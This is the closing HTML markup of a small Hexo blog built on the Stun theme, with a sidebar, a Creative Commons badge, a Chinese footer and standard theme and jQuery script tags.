+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">Hello Stun</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">归档</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2026</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Hermes</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v8.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.8.0</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
